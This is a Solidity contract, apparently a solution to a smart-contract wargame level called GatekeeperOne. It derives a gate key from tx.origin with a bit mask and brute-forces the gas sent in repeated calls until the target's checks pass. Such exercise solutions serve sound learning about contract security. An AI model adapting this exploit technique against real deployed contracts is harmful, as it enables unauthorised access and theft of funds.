// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack is GatekeeperOne {
    GatekeeperOne gatekeeperOne;
    uint256 public startGas;
    uint256 public endGas;

    constructor(address _gatekeeperContract) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperContract);
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i <= 300; i++) {
            try gatekeeperOne.enter{gas: i + 8191 * 4}(gateKey) {
                break;
            } catch {}
        }
    }
}
